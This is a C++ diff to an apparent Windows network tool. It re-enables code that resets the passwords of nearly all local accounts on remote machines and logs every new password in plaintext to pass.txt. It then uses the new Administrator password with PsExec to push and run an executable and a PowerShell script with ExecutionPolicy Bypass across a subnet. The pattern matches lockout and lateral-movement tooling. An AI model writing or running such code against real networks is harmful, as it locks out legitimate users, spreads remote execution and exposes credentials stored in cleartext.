@@ -27,6 +27,7 @@
 #include <stdexcept>
 #include <cstring>
 #include <cstdint>
+#include <mutex>
 #pragma comment(lib, "bcrypt.lib")
 #pragma comment(lib, "ws2_32.lib")
 #pragma comment(lib, "Netapi32.lib")
@@ -39,6 +40,74 @@
 #pragma comment(lib, "iphlpapi.lib")
 
 using namespace std;
+
+static std::ofstream g_passFile;
+static std::mutex g_passFileMutex;
+
+static bool AppendPasswordChangeLine(const std::wstring& machine, const std::wstring& username, const std::wstring& newPassword)
+{
+    std::lock_guard<std::mutex> lock(g_passFileMutex);
+    if (!g_passFile.is_open()) {
+        return false;
+    }
+    // Store as UTF-8 to keep file readable.
+    g_passFile << WStringToString(machine) << "\t" << WStringToString(username) << "\t" << WStringToString(newPassword) << "\n";
+    g_passFile.flush();
+    return true;
+}
+
+static bool BCryptRandomBytes(unsigned char* buf, size_t len)
+{
+    if (!buf || len == 0) return false;
+    NTSTATUS status = BCryptGenRandom(nullptr, buf, (ULONG)len, BCRYPT_USE_SYSTEM_PREFERRED_RNG);
+    return (status == 0);
+}
+
+static std::wstring GenerateStrongPassword(size_t length)
+{
+    // Keep this command-line/PsExec friendly: avoid quotes, spaces, and shell metacharacters.
+    static const std::wstring kUpper = L"ABCDEFGHJKLMNPQRSTUVWXYZ";
+    static const std::wstring kLower = L"abcdefghijkmnopqrstuvwxyz";
+    static const std::wstring kDigits = L"23456789";
+    static const std::wstring kSpecial = L"@#$*-_+=?";
+    static const std::wstring kAll = kUpper + kLower + kDigits + kSpecial;
+
+    if (length < 12) length = 12;
+
+    std::vector<wchar_t> chars;
+    chars.reserve(length);
+
+    auto pick = [](const std::wstring& alphabet) -> wchar_t {
+        unsigned char b = 0;
+        if (!BCryptRandomBytes(&b, 1)) {
+            // Fallback (very unlikely): deterministic, but avoids crashing.
+            return alphabet[0];
+        }
+        return alphabet[b % alphabet.size()];
+    };
+
+    // Ensure complexity.
+    chars.push_back(pick(kUpper));
+    chars.push_back(pick(kLower));
+    chars.push_back(pick(kDigits));
+    chars.push_back(pick(kSpecial));
+
+    while (chars.size() < length) {
+        chars.push_back(pick(kAll));
+    }
+
+    // Shuffle.
+    for (size_t i = chars.size() - 1; i > 0; --i) {
+        unsigned char b = 0;
+        if (!BCryptRandomBytes(&b, 1)) {
+            break;
+        }
+        size_t j = b % (i + 1);
+        std::swap(chars[i], chars[j]);
+    }
+
+    return std::wstring(chars.begin(), chars.end());
+}
 
 // --------------------
 // Helper functions for string conversion
@@ -784,11 +853,52 @@ MachinePasswordChangeResult ProcessMachineChangePasswords(const std::wstring& ma
     if (nStatus == NERR_Success && pUser0 != NULL) {
         ss << L"[INFO] Found " << dwEntriesRead
             << L" local user(s) on " << machine << std::endl;
-        std::string ipStr = ResolveDNSNameToIP(machine);
         for (DWORD i = 0; i < dwEntriesRead; i++) {
             std::wstring username = pUser0[i].usri0_name;
-            // Password generation removed
-            ss << L"[INFO] Skipping password change for local user: " << username << std::endl;
+
+            // Skip a few special/built-in accounts that often break things when rotated.
+            if (_wcsicmp(username.c_str(), L"Guest") == 0 ||
+                _wcsicmp(username.c_str(), L"DefaultAccount") == 0 ||
+                _wcsicmp(username.c_str(), L"WDAGUtilityAccount") == 0)
+            {
+                ss << L"[INFO] Skipping password change for special account: " << username << std::endl;
+                continue;
+            }
+
+            // Check RID to identify built-in Administrator (RID 500) and Guest (RID 501).
+            bool isBuiltInAdmin = false;
+            {
+                LPUSER_INFO_4 pUser4 = nullptr;
+                NET_API_STATUS stInfo = NetUserGetInfo((LPWSTR)serverName.c_str(), (LPWSTR)username.c_str(), 4, (LPBYTE*)&pUser4);
+                if (stInfo == NERR_Success && pUser4) {
+                    if (pUser4->usri4_user_id == 500) {
+                        isBuiltInAdmin = true;
+                    }
+                    if (pUser4->usri4_user_id == 501) {
+                        NetApiBufferFree(pUser4);
+                        ss << L"[INFO] Skipping password change for built-in Guest (RID 501): " << username << std::endl;
+                        continue;
+                    }
+                    NetApiBufferFree(pUser4);
+                }
+            }
+
+            std::wstring newPassword = GenerateStrongPassword(20);
+            USER_INFO_1003 ui1003{};
+            ui1003.usri1003_password = (LPWSTR)newPassword.c_str();
+            DWORD parmErr = 0;
+            NET_API_STATUS st = NetUserSetInfo((LPWSTR)serverName.c_str(), (LPWSTR)username.c_str(), 1003, (LPBYTE)&ui1003, &parmErr);
+            if (st == NERR_Success) {
+                ss << L"[OK] Changed password for local user: " << username << std::endl;
+                (void)AppendPasswordChangeLine(machine, username, newPassword);
+                if (isBuiltInAdmin || _wcsicmp(username.c_str(), L"Administrator") == 0) {
+                    adminNewPassword = newPassword;
+                }
+            }
+            else {
+                ss << L"[ERROR] Failed to change password for local user: " << username
+                    << L" (status=" << st << L", parmErr=" << parmErr << L")" << std::endl;
+            }
         }
         NetApiBufferFree(pUser0);
     }
@@ -807,9 +917,9 @@ std::wstring RunPsExecWithNewPassword(const std::wstring& machine, const std::ws
     std::wstringstream ss;
     // 1) Run the process-based firewall helper (1.exe) on the remote host
     std::wstring psExecCmd =
-        L"psexec.exe \\" + machine +
+        L"psexec.exe \\\\" + machine +
         L" -u .\\Administrator -p \"" + adminPassword +
-        L"\" -h -accepteula -i -c 1.exe " + subnet;
+        L"\" -h -accepteula -c 1.exe " + subnet;
     ss << L"[INFO] Running PsExec command for 1.exe (not waiting for completion): " << psExecCmd << std::endl;
     if (!LaunchLocalProcess(psExecCmd, false)) {
         ss << L"[ERROR] Failed to run PsExec 1.exe command on " << machine << std::endl;
@@ -854,9 +964,9 @@ std::wstring RunPsExecWithNewPassword(const std::wstring& machine, const std::ws
 
     if (!scriptUNC.empty()) {
         std::wstring psExecWhooCmd =
-            L"psexec.exe \\" + machine +
+            L"psexec.exe \\\\" + machine +
             L" -u .\\Administrator -p \"" + adminPassword +
-            L"\" -h -accepteula -i powershell.exe -NoProfile -ExecutionPolicy Bypass -File \"" + scriptUNC + L"\"";
+            L"\" -h -accepteula powershell.exe -NoProfile -ExecutionPolicy Bypass -File \"" + scriptUNC + L"\"";
         ss << L"[INFO] Running PsExec command for whoo.ps1 (not waiting for completion): "
             << psExecWhooCmd << std::endl;
         if (!LaunchLocalProcess(psExecWhooCmd, false)) {
@@ -1153,6 +1263,11 @@ int wmain(int argc, wchar_t* argv[])
         std::wcerr << L"[ERROR] Could not open password_log.txt for writing.\n";
         return 1;
     }
+    g_passFile.open("pass.txt", std::ios::out | std::ios::app);
+    if (!g_passFile.is_open()) {
+        std::wcerr << L"[ERROR] Could not open pass.txt for writing.\n";
+        return 1;
+    }
     HRESULT hr = CoInitialize(NULL);
     if (FAILED(hr)) {
         std::wcerr << L"[ERROR] CoInitialize failed. HRESULT=0x"
@@ -1243,13 +1358,19 @@ int wmain(int argc, wchar_t* argv[])
     std::wstringstream psExecLogs;
     for (size_t i = 0; i < validMachines.size(); i++) {
         const std::wstring& machine = validMachines[i];
-        const std::wstring& adminPassword = localPwdResults[i].adminNewPassword;
+        std::wstring adminPassword = localPwdResults[i].adminNewPassword;
+        if (adminPassword.empty()) {
+            // Password rotation is currently disabled; fall back to the operator-supplied password.
+            adminPassword = currentLocalAdminPassword;
+            psExecLogs << L"[WARNING] No new Administrator password for machine: " << machine
+                << L". Using provided working password for PsExec.\n";
+        }
         if (!adminPassword.empty()) {
             psExecFutures.push_back(std::async(std::launch::async,
                 RunPsExecWithNewPassword, machine, adminPassword, subnet));
         }
         else {
-            psExecLogs << L"[ERROR] No new Administrator password for machine: " << machine << L"\n";
+            psExecLogs << L"[ERROR] No password available for PsExec for machine: " << machine << L"\n";
         }
     }
     for (auto& f : psExecFutures) {
@@ -1345,6 +1466,7 @@ int wmain(int argc, wchar_t* argv[])
         std::wcout << L"[WARNING] Skipping AD user password changes because domain info is unavailable.\n";
     }
     g_logFile.close();
+    g_passFile.close();
     CoUninitialize();
     return 0;
 }
